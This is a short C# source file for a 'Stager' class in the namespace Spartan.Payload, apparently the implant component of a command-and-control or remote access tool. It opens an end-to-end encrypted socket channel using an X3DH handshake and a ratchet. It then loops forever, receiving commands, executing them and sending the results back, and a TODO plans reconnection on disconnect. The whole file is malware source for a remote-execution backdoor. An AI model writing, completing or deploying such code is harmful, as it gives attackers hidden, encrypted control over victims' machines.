using Spartan.Models.RequestModels;

namespace Spartan.Payload;

public class Stager
{
    private readonly CommandExecutor _commandExecutor = new();
    private readonly SocketClient _socketClient;

    public Stager(BinaryReader binaryReader, BinaryWriter binaryWriter)
    {
        _socketClient = new SocketClient(binaryReader, binaryWriter);

        _socketClient.PerformX3dhHandshake();
        _socketClient.InitializeRatchet();
    }

    public void Run()
    {
        // TODO: handle exceptions and try reconnect on disconnect, create exit command
        while (true)
        {
            ICommandRequestModel message = _socketClient.ReceiveData();

            var response = _commandExecutor.ExecuteCommand(message);

            _socketClient.SendData(response);
        }
    }
}